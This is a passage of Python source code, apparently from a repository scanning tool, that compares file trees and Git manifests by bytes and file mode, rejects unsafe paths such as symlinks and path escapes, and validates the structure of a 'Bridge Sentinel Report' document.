            "sha256": hashlib.sha256(rendered).hexdigest(),
            "base64": base64.b64encode(rendered).decode("ascii"),
        },
        "origin_map": origin,
        "protected_spans": protected,
        "active_imports": imports,
    }



def check_agents_budget(data: bytes, budget: int) -> dict[str, Any]:
    if budget < 0:
        raise ValueError("budget must be a non-negative integer")
    size = len(data)
    return {
        "contract": "agents-budget/v1",
        "bytes": size,
        "budget": budget,
        "fits": budget > 0 and size <= budget,
        "disabled": budget == 0,
        "warning_threshold": (
            False if budget == 0 else size >= (7 * budget) // 8
        ),
        "remaining": budget - size,
    }



def is_subsequence(left: list[bytes], right: list[bytes]) -> bool:
    iterator = iter(right)
    return all(any(candidate == item for candidate in iterator) for item in left)



def byte_lines(data: bytes) -> list[bytes]:
    """Split only at LF and retain line endings for raw-byte honesty."""
    lines: list[bytes] = []
    start = 0
    for index, value in enumerate(data):
        if value == 0x0A:
            lines.append(data[start : index + 1])
            start = index + 1
    if start < len(data):
        lines.append(data[start:])
    return lines



def diff_shape(source: bytes, projection: bytes) -> str:
    """Classify a changed byte pair by the report specification."""
    if source == projection:
        return "equal"
    source_lines = byte_lines(source)
    projection_lines = byte_lines(projection)
    if is_subsequence(source_lines, projection_lines):
        return "additions-only"
    if is_subsequence(projection_lines, source_lines):
        return "deletions-only"
    return "both"



def read_bytes(path: Path, normalized: bool) -> bytes:
    data = path.read_bytes()
    return normalize_n(data) if normalized else data



def compare_files(left: Path, right: Path, normalized: bool) -> dict[str, Any]:
    source = read_bytes(left, normalized)
    projection = read_bytes(right, normalized)
    shape = diff_shape(source, projection)
    return {
        "equal": shape == "equal",
        "shape": shape,
        "normalization": "N" if normalized else "none",
        "source": str(left),
        "projection": str(right),
    }



def inspect_tree(root: Path) -> dict[str, Any]:
    """Enumerate a tree without following links or reparse points."""
    if not root.is_dir():
        raise ValueError(f"not a directory: {root}")
    root_stat = root.lstat()
    reparse_flag = getattr(stat, "FILE_ATTRIBUTE_REPARSE_POINT", 0)
    if root.is_symlink() or (
        reparse_flag
        and getattr(root_stat, "st_file_attributes", 0) & reparse_flag
    ):
        return {
            "safe": False,
            "root": str(root),
            "files": [],
            "special": [{"path": ".", "kind": "linked-root"}],
        }
    files: dict[str, Path] = {}
    special: list[dict[str, str]] = []
    folded: dict[str, str] = {}
    stack: list[tuple[Path, str]] = [(root, "")]

    while stack:
        directory, prefix = stack.pop()
        with os.scandir(directory) as iterator:
            entries = sorted(iterator, key=lambda item: os.fsencode(item.name))
        for entry in entries:
            relative = f"{prefix}/{entry.name}" if prefix else entry.name
            relative = relative.replace("\\", "/")
            folded_name = relative.casefold()
            prior = folded.get(folded_name)
            if prior is not None and prior != relative:
                special.append(
                    {
                        "path": relative,
                        "kind": "case-fold-collision",
                        "detail": prior,
                    }
                )
                continue
            folded[folded_name] = relative

            entry_stat = entry.stat(follow_symlinks=False)
            is_reparse = bool(
                reparse_flag
                and getattr(entry_stat, "st_file_attributes", 0) & reparse_flag
            )
            if entry.is_symlink():
                special.append({"path": relative, "kind": "symlink"})
            elif is_reparse:
                special.append({"path": relative, "kind": "reparse-point"})
            elif entry.is_dir(follow_symlinks=False):
                stack.append((Path(entry.path), relative))
            elif entry.is_file(follow_symlinks=False) and stat.S_ISREG(
                entry_stat.st_mode
            ):
                files[relative] = Path(entry.path)
            else:
                special.append({"path": relative, "kind": "special-file"})

    return {
        "safe": not special,
        "root": str(root),
        "files": sorted(files),
        "special": sorted(
            special,
            key=lambda item: (
                os.fsencode(item["path"]),
                os.fsencode(item["kind"]),
            ),
        ),
    }



def relative_files(root: Path) -> dict[str, Path]:
    inspection = inspect_tree(root)
    if not inspection["safe"]:
        raise ValueError(
            "unsafe tree entries: "
            + json.dumps(inspection["special"], ensure_ascii=False)
        )
    return {
        name: root.joinpath(*name.split("/"))
        for name in inspection["files"]
    }



def aggregate_shapes(shapes: Iterable[str]) -> str:
    changed = [shape for shape in shapes if shape != "equal"]
    if not changed:
        return "equal"
    if all(shape == "additions-only" for shape in changed):
        return "additions-only"
    if all(shape == "deletions-only" for shape in changed):
        return "deletions-only"
    return "both"



def compare_trees(master: Path, copy: Path) -> dict[str, Any]:
    """Compare only filesystem paths and bytes; Git modes are out of scope."""
    master_files = relative_files(master)
    copy_files = relative_files(copy)
    master_names = set(master_files)
    copy_names = set(copy_files)
    source_only = sorted(master_names - copy_names)
    projection_only = sorted(copy_names - master_names)
    changed: list[dict[str, str]] = []
    shapes: list[str] = []

    shapes.extend("deletions-only" for _ in source_only)
    shapes.extend("additions-only" for _ in projection_only)

    for name in sorted(master_names & copy_names):
        source = master_files[name].read_bytes()
        projection = copy_files[name].read_bytes()
        shape = diff_shape(source, projection)
        if shape != "equal":
            changed.append({"path": name, "shape": shape})
            shapes.append(shape)

    shape = aggregate_shapes(shapes)
    return {
        "comparison": "filesystem-paths-and-bytes/v1",
        "mode_checked": False,
        "equal": shape == "equal",
        "shape": shape,
        "source_only": source_only,
        "projection_only": projection_only,
        "changed": changed,
        "master": str(master),
        "copy": str(copy),
    }



def git_run(
    repo: Path,
    arguments: list[str],
    *,
    allow_failure: bool = False,
    input_data: Optional[bytes] = None,
) -> subprocess.CompletedProcess[bytes]:
    """Run a read-only Git command and retain byte-exact stdout."""
    process = subprocess.run(
        ["git", "-C", str(repo), *arguments],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        input=input_data,
        check=False,
    )
    if process.returncode and not allow_failure:
        detail = process.stderr.decode("utf-8", errors="replace").strip()
        raise ValueError(
            f"git {' '.join(arguments)} failed"
            + (f": {detail}" if detail else "")
        )
    return process



def resolve_git_root(repo: Path) -> Path:
    invoked = repo.resolve()
    result = git_run(invoked, ["rev-parse", "--show-toplevel"])
    discovered = Path(
        result.stdout.decode("utf-8", errors="strict").strip()
    ).resolve()
    if os.path.normcase(str(invoked)) != os.path.normcase(str(discovered)):
        raise ValueError(
            f"repository argument is not the worktree root: {repo}"
        )
    return discovered



def resolve_commit_revision(repo: Path, revision: str) -> str:
    """Resolve one revision to a commit and reject tree/blob selectors."""

    result = git_run(
        repo,
        [
            "rev-parse",
            "--verify",
            "--end-of-options",
            f"{revision}^{{commit}}",
        ],
        allow_failure=True,
    )
    if result.returncode:
        raise ValueError(f"revision must resolve to a commit: {revision}")
    resolved = result.stdout.decode("ascii", errors="strict").strip()
    if re.fullmatch(r"(?:[0-9a-f]{40}|[0-9a-f]{64})", resolved) is None:
        raise ValueError(
            f"revision resolved to an invalid commit object id: {revision}"
        )
    return resolved



def normalize_unit_root(value: str) -> str:
    """Validate a repository-relative POSIX unit root."""
    if not value or "\\" in value or value.startswith("./"):
        raise ValueError(
            "unit root must be a non-empty canonical repo-relative POSIX path"
        )
    path = PurePosixPath(value)
    if path.is_absolute() or value == "." or any(
        part in {"", ".", ".."} for part in path.parts
    ) or path.as_posix() != value:
        raise ValueError(
            "unit root must be a non-empty canonical repo-relative POSIX path"
        )
    return path.as_posix()



def normalize_entry_path(value: str) -> str:
    """Validate a canonical POSIX path relative to one unit root."""
    if not value or "\\" in value or value.startswith("./"):
        raise ValueError(
            "entry path must be a non-empty canonical unit-relative POSIX path"
        )
    path = PurePosixPath(value)
    if path.is_absolute() or value == "." or any(
        part in {"", ".", ".."} for part in path.parts
    ) or path.as_posix() != value:
        raise ValueError(
            "entry path must be a non-empty canonical unit-relative POSIX path"
        )
    return path.as_posix()



def git_pathspec(unit_root: str) -> str:
    return f":(literal){unit_root}"



def decode_git_path(value: bytes) -> str:
    try:
        path = value.decode("utf-8", errors="strict")
    except UnicodeDecodeError as error:
        raise ValueError(
            "Git path is not valid UTF-8 and cannot enter the v1 manifest"
        ) from error
    if "\x00" in path:
        raise ValueError("Git path contains NUL")
    return path



def relative_unit_path(repo_path: str, unit_root: str) -> str:
    if repo_path == unit_root:
        return "."
    prefix = unit_root + "/"
    if not repo_path.startswith(prefix):
        raise ValueError(
            f"Git returned a path outside unit {unit_root}: {repo_path}"
        )
    relative = repo_path[len(prefix) :]
    if not relative:
        raise ValueError(f"empty relative path below unit {unit_root}")
    return relative



def parse_index_entries(repo: Path, unit_root: str) -> list[dict[str, str]]:
    result = git_run(
        repo,
        ["ls-files", "--stage", "-z", "--", git_pathspec(unit_root)],
    )
    entries: list[dict[str, str]] = []
    for record in result.stdout.split(b"\0"):
        if not record:
            continue
        try:
            metadata, raw_path = record.split(b"\t", 1)
            mode, oid, stage = metadata.decode("ascii").split(" ")
        except (ValueError, UnicodeDecodeError) as error:
            raise ValueError("malformed git ls-files --stage record") from error
        repo_path = decode_git_path(raw_path)
        relative_unit_path(repo_path, unit_root)
        entries.append(
            {
                "repo_path": repo_path,
                "mode": mode,
                "oid": oid,
                "stage": stage,
            }
        )
    return entries



def parse_tree_entries(
    repo: Path, unit_root: str, revision: str
) -> list[dict[str, str]]:
    result = git_run(
        repo,
        [
            "ls-tree",
            "-r",
            "-z",
            "--full-tree",
            revision,
            "--",
            git_pathspec(unit_root),
        ],
    )
    entries: list[dict[str, str]] = []
    for record in result.stdout.split(b"\0"):
        if not record:
            continue
        try:
            metadata, raw_path = record.split(b"\t", 1)
            mode, object_type, oid = metadata.decode("ascii").split(" ")
        except (ValueError, UnicodeDecodeError) as error:
            raise ValueError("malformed git ls-tree record") from error
        repo_path = decode_git_path(raw_path)
        relative_unit_path(repo_path, unit_root)
        entries.append(
            {
                "repo_path": repo_path,
                "mode": mode,
                "oid": oid,
                "object_type": object_type,
            }
        )
    return entries



def untracked_paths(repo: Path, unit_root: str) -> list[str]:
    result = git_run(
        repo,
        [
            "ls-files",
            "--others",
            "--exclude-standard",
            "-z",
            "--",
            git_pathspec(unit_root),
        ],
    )
    paths = [
        decode_git_path(record)
        for record in result.stdout.split(b"\0")
        if record
    ]
    for path in paths:
        relative_unit_path(path, unit_root)
    return paths



def core_filemode(repo: Path) -> bool:
    result = git_run(
        repo, ["config", "--bool", "--get", "core.filemode"], allow_failure=True
    )
    if result.returncode == 1:
        return os.name != "nt"
    if result.returncode:
        detail = result.stderr.decode("utf-8", errors="replace").strip()
        raise ValueError(
            "cannot read core.filemode" + (f": {detail}" if detail else "")
        )
    value = result.stdout.decode("ascii", errors="strict").strip()
    if value not in {"true", "false"}:
        raise ValueError(f"unexpected core.filemode value: {value}")
    return value == "true"



def is_reparse(path_stat: os.stat_result) -> bool:
    reparse_flag = getattr(stat, "FILE_ATTRIBUTE_REPARSE_POINT", 0)
    return bool(
        reparse_flag
        and getattr(path_stat, "st_file_attributes", 0) & reparse_flag
    )



def classify_path(repo: Path, repo_path: str) -> tuple[str, Optional[os.stat_result]]:
    """Classify a worktree path while rejecting linked parent traversal."""
    candidate = repo
    parts = PurePosixPath(repo_path).parts
    if os.name == "nt" and any("\\" in part for part in parts):
        return "unrepresentable-git-path", None
    for index, part in enumerate(parts):
        candidate = candidate / part
        try:
            candidate_stat = candidate.lstat()
        except FileNotFoundError:
            return "missing", None
        if candidate.is_symlink():
            return (
                "symlink" if index == len(parts) - 1 else "linked-parent",
                candidate_stat,
            )
        if is_reparse(candidate_stat):
            return (
                "reparse-point"
                if index == len(parts) - 1
                else "linked-parent",
                candidate_stat,
            )
        if index < len(parts) - 1 and not stat.S_ISDIR(candidate_stat.st_mode):
            return "non-directory-parent", candidate_stat

    resolved = candidate.resolve()
    try:
        common = os.path.commonpath([str(repo), str(resolved)])
    except ValueError:
        return "path-escape", candidate_stat
    if os.path.normcase(common) != os.path.normcase(str(repo)):
        return "path-escape", candidate_stat
    if stat.S_ISREG(candidate_stat.st_mode):
        return "regular", candidate_stat
    if stat.S_ISDIR(candidate_stat.st_mode):
        return "directory", candidate_stat
    return "special-file", candidate_stat



def sha256_evidence(data: bytes, source: str, **extra: Any) -> dict[str, Any]:
    evidence: dict[str, Any] = {
        "sha256": hashlib.sha256(data).hexdigest(),
        "size": len(data),
        "source": source,
    }
    evidence.update(extra)
    return evidence



def filesystem_git_mode(path_stat: os.stat_result) -> str:
    return "100755" if path_stat.st_mode & 0o111 else "100644"



def append_blocker(
    blockers: list[dict[str, str]], token: str, path: str, detail: str
) -> None:
    blocker = {"token": token, "path": path, "detail": detail}
    if blocker not in blockers:
        blockers.append(blocker)



def mode_for_current_file(
    *,
    path_stat: os.stat_result,
    tracked: bool,
    index_mode: Optional[str],
    head_mode: Optional[str],
    probe_reliable: bool,
    blockers: list[dict[str, str]],
    relative: str,
    require_executable: bool,
) -> tuple[str, dict[str, Any]]:
    """Resolve effective Git mode and expose each evidence layer."""
    filesystem_mode = (
        filesystem_git_mode(path_stat) if probe_reliable else None
    )
    if tracked:
        if index_mode not in REGULAR_GIT_MODES:
            raise ValueError(f"unsupported regular index mode: {index_mode}")
        effective = filesystem_mode if filesystem_mode is not None else index_mode
        if (
            require_executable
            and effective != "100755"
            and not probe_reliable
        ):
            append_blocker(
                blockers,
                "mode-limited",
                relative,
                "explicit executable intent cannot be realized because "
                "worktree mode changes are unavailable",
            )
        return effective, {
            "head": head_mode or "absent",
            "index": index_mode,
            "worktree": filesystem_mode or "unavailable",
            "effective_source": (
                "posix-filesystem-exec"
                if filesystem_mode is not None
                else "git-index"
            ),
            "staged_change": head_mode is not None and head_mode != index_mode,
            "unstaged_change": (
                filesystem_mode != index_mode
                if filesystem_mode is not None
                else "unobservable"
            ),
            "prospective": False,
            "explicit_executable_required": require_executable,
        }

    if filesystem_mode is None:
        if require_executable:
            append_blocker(
                blockers,
                "mode-limited",
                relative,
                "explicit executable intent requires 100755, but this host "
                "can establish only the prospective untracked default 100644",
            )
        return "100644", {
            "head": "absent",
            "index": "absent",
            "worktree": "unavailable",
            "effective_source": "platform-untracked-default",
            "staged_change": False,
            "unstaged_change": "unobservable",
            "prospective": True,
            "explicit_executable_required": require_executable,
        }
    return filesystem_mode, {
        "head": "absent",
        "index": "absent",
        "worktree": filesystem_mode,
        "effective_source": "posix-filesystem-exec",
        "staged_change": False,
        "unstaged_change": False,
        "prospective": True,
        "explicit_executable_required": require_executable,
    }



def detect_casefold_collisions(
    paths: Iterable[str], blockers: list[dict[str, str]]
) -> None:
    folded: dict[str, str] = {}
    for path in sorted(paths, key=lambda item: item.encode("utf-8")):
        prior = folded.get(path.casefold())
        if prior is not None and prior != path:
            append_blocker(
                blockers,
                "unsafe-tree-entry",
                path,
                f"case-fold-collision with {prior}",
            )
        else:
            folded[path.casefold()] = path



def detect_unit_casefold_collisions(
    current_paths: Iterable[str],
    tracked_deletions: Iterable[str],
    blockers: list[dict[str, str]],
) -> None:
    """Apply the unit-wide gate to current and deleted tracked path names."""
    domain = set(current_paths)
    domain.update(tracked_deletions)
    detect_casefold_collisions(domain, blockers)



def manifest_from_revision(
    repo: Path,
    unit_root: str,
    revision_input: str,
    resolved_commit: str,
) -> dict[str, Any]:
    blockers: list[dict[str, str]] = []
    entries: list[dict[str, Any]] = []
    tree_entries = parse_tree_entries(repo, unit_root, resolved_commit)

    for item in tree_entries:
        relative = relative_unit_path(item["repo_path"], unit_root)
        mode = item["mode"]
        object_type = item["object_type"]
        if mode not in REGULAR_GIT_MODES or object_type != "blob":
            kind = (
                "git-symlink"
                if mode == "120000"
                else "gitlink"
                if mode == "160000"
                else f"git-{object_type}-{mode}"
            )
            append_blocker(
                blockers, "unsafe-tree-entry", relative, kind
            )
            entries.append(
                {
                    "path": relative,
                    "repo_path": item["repo_path"],
                    "type": kind,
                    "bytes": None,
                    "mode": mode,
                    "mode_evidence": {
                        "tree": resolved_commit,
                        "tree_mode": mode,
                        "effective_source": "git-tree",
                    },
                    "tracked": True,
                }
            )
            continue

        blob = git_run(repo, ["cat-file", "blob", item["oid"]]).stdout
        entries.append(
            {
                "path": relative,
                "repo_path": item["repo_path"],
                "type": "regular",
                "bytes": sha256_evidence(
                    blob,
                    "git-blob",
                    blob_oid=item["oid"],
                    revision=resolved_commit,
                ),
                "mode": mode,
                "mode_evidence": {
                    "tree": resolved_commit,
                    "tree_mode": mode,
                    "effective_source": "git-tree",
                },
                "tracked": True,
            }
        )

    detect_unit_casefold_collisions(
        (entry["path"] for entry in entries), (), blockers
    )
    entries.sort(key=lambda item: item["path"].encode("utf-8"))
    blockers.sort(
        key=lambda item: (
            item["path"].encode("utf-8"),
            item["token"].encode("utf-8"),
            item["detail"].encode("utf-8"),
        )
    )
    return {
        "contract": "git-tree-manifest/v1",
        "repository": str(repo),
        "unit": unit_root,
        "snapshot": "revision",
        "revision": revision_input,
        "resolved_commit": resolved_commit,
        "include_untracked": False,
        "core_filemode": None,
        "worktree_mode_probe": "not-applicable",
        "worktree_mode_write": "not-applicable",
        "required_executable": [],
        "safe": not blockers,
        "mode_limited": any(
            blocker["token"] == "mode-limited" for blocker in blockers
        ),
        "entries": entries,
        "tracked_deletions": [],
        "blockers": blockers,
    }



def manifest_from_worktree(
    repo: Path,
    unit_root: str,
    include_untracked: bool,
    required_executable: set[str],
) -> dict[str, Any]:
    blockers: list[dict[str, str]] = []
    entries: list[dict[str, Any]] = []
    tracked_deletions: list[str] = []
    filemode = core_filemode(repo)
    probe_reliable = os.name != "nt" and filemode

    root_kind, _ = classify_path(repo, unit_root)
    if root_kind not in {"missing", "directory"}:
        append_blocker(
            blockers, "unsafe-tree-entry", ".", f"unit-root-{root_kind}"
        )

    index_entries = parse_index_entries(repo, unit_root)
    head_result = git_run(
        repo, ["rev-parse", "--verify", "HEAD^{tree}"], allow_failure=True
    )
    head_entries = (
        parse_tree_entries(repo, unit_root, "HEAD")
        if head_result.returncode == 0
        else []
    )
    head_modes = {
        item["repo_path"]: item["mode"] for item in head_entries
    }

    seen_index: set[str] = set()
    for item in index_entries:
        relative = relative_unit_path(item["repo_path"], unit_root)
        if item["stage"] != "0":
            append_blocker(
                blockers,
                "unsafe-tree-entry",
                relative,
                f"unmerged-index-stage-{item['stage']}",
            )
            continue
        if item["repo_path"] in seen_index:
            append_blocker(
                blockers,
                "unsafe-tree-entry",
                relative,
                "duplicate-index-entry",
            )
            continue
        seen_index.add(item["repo_path"])

        if item["mode"] not in REGULAR_GIT_MODES:
            kind = (
                "git-symlink"
                if item["mode"] == "120000"
                else "gitlink"
                if item["mode"] == "160000"
                else f"git-mode-{item['mode']}"
            )
            append_blocker(
                blockers, "unsafe-tree-entry", relative, kind
            )
            entries.append(
                {
                    "path": relative,
                    "repo_path": item["repo_path"],
                    "type": kind,
                    "bytes": None,
                    "mode": item["mode"],
                    "mode_evidence": {
                        "head": head_modes.get(item["repo_path"], "absent"),
                        "index": item["mode"],
                        "worktree": "not-read",
                        "effective_source": "git-index",
                    },
                    "tracked": True,
                }
            )
            continue

        path_kind, path_stat = classify_path(repo, item["repo_path"])
        if path_kind == "missing":
            tracked_deletions.append(relative)
            continue
        if path_kind != "regular" or path_stat is None:
            append_blocker(
                blockers,
                "unsafe-tree-entry",
                relative,
                f"worktree-{path_kind}",
            )
            continue

        worktree_path = repo.joinpath(*PurePosixPath(item["repo_path"]).parts)
        data = worktree_path.read_bytes()
        mode, mode_evidence = mode_for_current_file(
            path_stat=path_stat,
            tracked=True,
            index_mode=item["mode"],
            head_mode=head_modes.get(item["repo_path"]),
            probe_reliable=probe_reliable,
            blockers=blockers,
            relative=relative,
            require_executable=relative in required_executable,
        )
        entries.append(
            {
                "path": relative,
                "repo_path": item["repo_path"],
                "type": "regular",
                "bytes": sha256_evidence(
                    data,
                    "worktree",
                    index_oid=item["oid"],
                ),
                "mode": mode,
                "mode_evidence": mode_evidence,
                "tracked": True,
            }
        )

    for repo_path in head_modes:
        if repo_path not in seen_index:
            tracked_deletions.append(relative_unit_path(repo_path, unit_root))

    if include_untracked:
        for repo_path in untracked_paths(repo, unit_root):
            relative = relative_unit_path(repo_path, unit_root)
            path_kind, path_stat = classify_path(repo, repo_path)
            if path_kind != "regular" or path_stat is None:
                append_blocker(
                    blockers,
                    "unsafe-tree-entry",
                    relative,
                    f"untracked-{path_kind}",
                )
                continue
            worktree_path = repo.joinpath(*PurePosixPath(repo_path).parts)
            data = worktree_path.read_bytes()
            mode, mode_evidence = mode_for_current_file(
                path_stat=path_stat,
                tracked=False,
                index_mode=None,
                head_mode=None,
                probe_reliable=probe_reliable,
                blockers=blockers,
                relative=relative,
                require_executable=relative in required_executable,
            )
            entries.append(
                {
                    "path": relative,
                    "repo_path": repo_path,
                    "type": "regular",
                    "bytes": sha256_evidence(data, "untracked-worktree"),
                    "mode": mode,
                    "mode_evidence": mode_evidence,
                    "tracked": False,
                }
            )

    present_paths = {entry["path"] for entry in entries}
    if not probe_reliable:
        for relative in required_executable - present_paths:
            append_blocker(
                blockers,
                "mode-limited",
                relative,
                "explicit executable intent requires creating 100755, but "
                "this host can establish only the prospective default 100644",
            )

    detect_unit_casefold_collisions(
        (entry["path"] for entry in entries), tracked_deletions, blockers
    )
    entries.sort(key=lambda item: item["path"].encode("utf-8"))
    tracked_deletions.sort(key=lambda item: item.encode("utf-8"))
    blockers.sort(
        key=lambda item: (
            item["path"].encode("utf-8"),
            item["token"].encode("utf-8"),
            item["detail"].encode("utf-8"),
        )
    )
    return {
        "contract": "git-tree-manifest/v1",
        "repository": str(repo),
        "unit": unit_root,
        "snapshot": "worktree",
        "revision": None,
        "include_untracked": include_untracked,
        "core_filemode": filemode,
        "worktree_mode_probe": (
            "posix-executable-bits"
            if probe_reliable
            else "index-for-tracked; prospective-100644-for-untracked"
        ),
        "worktree_mode_write": (
            "posix-executable-bits" if probe_reliable else "unavailable"
        ),
        "required_executable": sorted(
            required_executable, key=lambda item: item.encode("utf-8")
        ),
        "safe": not blockers,
        "mode_limited": any(
            blocker["token"] == "mode-limited" for blocker in blockers
        ),
        "entries": entries,
        "tracked_deletions": tracked_deletions,
        "blockers": blockers,
    }



def git_manifest(
    repo: Path,
    unit_root_value: str,
    *,
    revision: Optional[str],
    include_untracked: bool,
    required_executable: Iterable[str] = (),
) -> dict[str, Any]:
    root = resolve_git_root(repo)
    unit_root = normalize_unit_root(unit_root_value)
    executable_paths = {
        normalize_entry_path(path) for path in required_executable
    }
    if revision is not None and include_untracked:
        raise ValueError("--include-untracked is valid only for a worktree manifest")
    if revision is not None and executable_paths:
        raise ValueError(
            "--require-executable is valid only for a worktree manifest"
        )
    if revision is not None and (
        revision.startswith("-") or "\x00" in revision
    ):
        raise ValueError("revision must not begin with '-' or contain NUL")
    if revision is not None:
        resolved_commit = resolve_commit_revision(root, revision)
        return manifest_from_revision(
            root,
            unit_root,
            revision,
            resolved_commit,
        )
    return manifest_from_worktree(
        root, unit_root, include_untracked, executable_paths
    )



def target_can_realize_mode(
    target_manifest: dict[str, Any],
    target_entry: Optional[dict[str, Any]],
    required_mode: str,
) -> bool:
    if target_entry is not None and target_entry.get("mode") == required_mode:
        return True
    if target_manifest.get("worktree_mode_write") == "posix-executable-bits":
        return True
    if target_entry is None:
        return required_mode == "100644"
    if (
        not target_entry.get("tracked", True)
        and target_entry.get("mode_evidence", {}).get("effective_source")
        == "platform-untracked-default"
    ):
        return required_mode == "100644"
    return False



def compare_git_manifests(
    source: dict[str, Any],
    projection: dict[str, Any],
    *,
    direction: str = "observe",
) -> dict[str, Any]:
    if direction not in GIT_TREE_DIRECTIONS:
        raise ValueError(f"unsupported Git-tree comparison direction: {direction}")
    if direction != "observe" and (
        source["snapshot"] != "worktree"
        or projection["snapshot"] != "worktree"
    ):
        raise ValueError(
            "a write direction is valid only between worktree manifests"
        )
    source_entries = {entry["path"]: entry for entry in source["entries"]}
    projection_entries = {
        entry["path"]: entry for entry in projection["entries"]
    }
    source_names = set(source_entries)
    projection_names = set(projection_entries)
    source_only = sorted(
        source_names - projection_names, key=lambda item: item.encode("utf-8")
    )
    projection_only = sorted(
        projection_names - source_names,
        key=lambda item: item.encode("utf-8"),
    )
    changed: list[dict[str, Any]] = []

    for path in sorted(
        source_names & projection_names, key=lambda item: item.encode("utf-8")
    ):
        left = source_entries[path]
        right = projection_entries[path]
        type_changed = left["type"] != right["type"]
        left_bytes = (
            left["bytes"]["sha256"] if left["bytes"] is not None else None
        )
        right_bytes = (
            right["bytes"]["sha256"] if right["bytes"] is not None else None
        )
        bytes_changed = left_bytes != right_bytes
        mode_changed = left["mode"] != right["mode"]
        if not (type_changed or bytes_changed or mode_changed):
            continue
        if type_changed:
            kind = "type"
        elif bytes_changed and mode_changed:
            kind = "bytes-and-mode"
        elif bytes_changed:
            kind = "bytes-only"
        else:
            kind = "mode-only"
        changed.append(
            {
                "path": path,
                "kind": kind,
                "source": {
                    "type": left["type"],
                    "bytes_sha256": left_bytes,
                    "mode": left["mode"],
                },
                "projection": {
                    "type": right["type"],
                    "bytes_sha256": right_bytes,
                    "mode": right["mode"],
                },
            }
        )

    blockers = [
        {"side": "source", **item} for item in source["blockers"]
    ] + [
        {"side": "projection", **item}
        for item in projection["blockers"]
    ]
    if direction != "observe":
        if direction == "source-to-projection":
            authority_entries = source_entries
            authority_manifest = source
            target_entries = projection_entries
            target_manifest = projection
            target_side = "projection"
        else:
            authority_entries = projection_entries
            authority_manifest = projection
            target_entries = source_entries
            target_manifest = source
            target_side = "source"

        executable_requirements = set(
            authority_manifest.get("required_executable", [])
        )
        for path in sorted(
            authority_entries, key=lambda item: item.encode("utf-8")
        ):
            authority_entry = authority_entries[path]
            required_mode = (
                "100755"
                if path in executable_requirements
                else authority_entry.get("mode")
            )
            if (
                authority_entry.get("type") != "regular"
                or required_mode not in REGULAR_GIT_MODES
            ):
                continue
            target_entry = target_entries.get(path)
            if target_entry is not None and target_entry.get("type") != "regular":
                continue
            if target_can_realize_mode(
                target_manifest, target_entry, required_mode
            ):
                continue
            blocker = {
                "side": target_side,
                "token": "mode-limited",
                "path": path,
                "detail": (
                    f"{direction} requires target mode {required_mode}, but "
                    "this host cannot realize that mode without changing "
                    "the Git index"
                ),
            }
            if blocker not in blockers:
                blockers.append(blocker)
    blockers.sort(
        key=lambda item: (
            item["side"].encode("utf-8"),
            item["path"].encode("utf-8"),
            item["token"].encode("utf-8"),
            item["detail"].encode("utf-8"),
        )
    )
    comparable = source["safe"] and projection["safe"] and not blockers
    equal = (
        comparable
        and not source_only
        and not projection_only
        and not changed
    )
    return {
        "contract": "git-tree-comparison/v1",
        "direction": direction,
        "identity_fields": ["path", "type", "bytes.sha256", "mode"],
        "comparable": comparable,
        "mode_limited": any(
            blocker["token"] == "mode-limited" for blocker in blockers
        ),
        "equal": equal,
        "source_only": source_only,
        "projection_only": projection_only,
        "changed": changed,
        "blockers": blockers,
        "source_manifest": source,
        "projection_manifest": projection,
    }



def compare_git_trees(
    repo: Path,
    source_unit: str,
    projection_unit: str,
    *,
    revision: Optional[str],
    include_untracked: bool,
    direction: str = "observe",
    required_executable: Iterable[str] = (),
) -> dict[str, Any]:
    source = git_manifest(
        repo,
        source_unit,
        revision=revision,
        include_untracked=include_untracked,
        required_executable=required_executable,
    )
    projection = git_manifest(
        repo,
        projection_unit,
        revision=revision,
        include_untracked=include_untracked,
        required_executable=required_executable,
    )
    return compare_git_manifests(
        source, projection, direction=direction
    )



def normalized_text(path: Path) -> list[str]:
    return normalize_n(path.read_bytes()).decode("utf-8").splitlines()



def header_value(lines: list[str], key: str) -> Optional[str]:
    prefix = f"- {key}:"
    headings = [
        index for index, line in enumerate(lines) if line.startswith("## ")
    ]
    limit = headings[0] if headings else len(lines)
    matches = [
        line[len(prefix) :].strip()
        for line in lines[:limit]
        if line.startswith(prefix)
    ]
    if len(matches) > 1:
        raise ValueError(f"duplicate header: - {key}:")
    return matches[0] if matches else None



def validate_report_document(
    lines: list[str], *, expectation: bool
) -> dict[str, str]:
    """Validate the closed report/v5 or expectation document skeleton."""

    heading_indexes = [
        index for index, line in enumerate(lines) if line.startswith("## ")
    ]
    if not heading_indexes:
        raise ValueError("report document has no level-two sections")
    header_lines = [
        line for line in lines[: heading_indexes[0]] if line != ""
    ]
    keys = (
        (
            "expectation",
            "scan root",
            "scope excludes",
            "activation profile",
            "onboarding",
        )
        if expectation
        else (
            "project",
            "scan root",
            "scope excludes",
            "date",
            "spec",
            "scan surfaces",
            "onboarding",
        )
    )
    if expectation:
        metadata = header_lines
    else:
        if not header_lines or header_lines[0] != "# Bridge Sentinel Report":
            raise ValueError(
                "produced report must start with '# Bridge Sentinel Report'"
            )
        metadata = header_lines[1:]
    if len(metadata) != len(keys):
        raise ValueError("report header has missing or unexpected fields")
    fields: dict[str, str] = {}
    for line, key in zip(metadata, keys):
        prefix = f"- {key}: "
        if not line.startswith(prefix):
            raise ValueError(
                f"report header expected '- {key}: <value>'"
            )
        value = line[len(prefix) :]
        if not value or value != value.strip(" \t"):
            raise ValueError(f"report header {key} has an invalid value")
        fields[key] = value

    headings = [lines[index][3:] for index in heading_indexes]
    required_headings = (
        ["Findings", "Observations"]
        if expectation
        else [
            "Findings",
            "Observations",
            "Evidence and notes",
            "Local environment notes",
        ]
    )
    if headings != required_headings:
        raise ValueError(
            "report sections must be exactly: "
            + ", ".join(required_headings)
        )

    version_key = "expectation" if expectation else "spec"
    if fields[version_key] != REPORT_SPEC:
        raise ValueError(
            f"report document expected {version_key}: {REPORT_SPEC}"
        )
    if fields["onboarding"] not in {
        "onboarded",
        "not-onboarded",
        "blocked",
    }:
        raise ValueError("report onboarding value is invalid")
    if not expectation:
        if fields["scan surfaces"] != "agents-md, hooks, skills":
            raise ValueError("produced report scan surfaces are invalid")
        try:
            parsed_date = datetime.date.fromisoformat(fields["date"])
        except ValueError as error:
            raise ValueError("produced report date is invalid") from error
        if parsed_date.isoformat() != fields["date"]:
            raise ValueError("produced report date is not canonical")
    return fields



def section_lines(lines: list[str], heading: str) -> list[str]:
    marker = f"## {heading}"
    try:
        start = lines.index(marker) + 1
    except ValueError as error:
        raise ValueError(f"missing section: {marker}") from error
    result: list[str] = []
    for line in lines[start:]:
        if line.startswith("## "):
            break
